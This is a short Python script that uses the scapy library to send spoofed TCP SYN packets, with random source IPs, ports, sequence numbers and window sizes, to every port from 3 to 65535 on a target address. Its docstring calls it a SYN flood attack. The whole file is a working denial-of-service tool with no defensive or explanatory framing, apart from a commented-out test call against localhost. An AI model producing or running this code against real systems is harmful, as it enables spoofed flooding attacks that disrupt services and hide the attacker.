# Requires scapy and npcap
from scapy.all import IP, TCP, send
from utilities import randInt, randomIP


def SCAN_Flood(targetIP, numPackets):
    """
    Sends packets over all ports

    Parameters:
    targetIP (str) : IP to run SYN Flood attack on
    numPackets (int) : Number of SYN packets to send to each port
    """
    
    # Loop over number of packets to send to each port
    for i in range(numPackets):
        # Generate spoofed TCP packet values
        spoof_port = randInt()
        spoof_eq = randInt()
        spoof_window = randInt()
        
        # Loop over each specified port
        for port in range(3, 65536):
            # Create spoofed TCP Packet
            TCP_Packet = TCP()	
            TCP_Packet.sport = spoof_port
            TCP_Packet.dport = port
            TCP_Packet.flags = "S"
            TCP_Packet.seq = spoof_eq
            TCP_Packet.window = spoof_window

            # Send spoofed TCP SYN packet
            send(IP(src=randomIP(), dst=targetIP)/TCP_Packet, verbose=0)
            #print(f"Sent packet to {targetIP}:{port}")

#SCAN_Flood('127.0.0.1', 1)